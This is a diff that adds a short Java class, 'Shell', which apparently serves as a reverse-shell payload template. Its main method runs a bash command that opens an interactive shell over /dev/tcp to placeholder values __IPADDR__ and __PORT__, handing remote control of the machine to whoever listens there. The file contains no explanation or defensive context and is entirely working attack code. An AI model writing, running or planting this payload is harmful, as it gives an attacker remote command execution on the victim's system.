@@ -1,0 +1,16 @@
+public class Shell {
+    public static void main(String[] args) {
+        Process p;
+        try {
+            p = Runtime.getRuntime().exec(new String[]{
+                "bash", "-c", "bash -i >& /dev/tcp/__IPADDR__/__PORT__ 0>&1"
+            });
+
+            p.waitFor();
+            p.destroy();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+
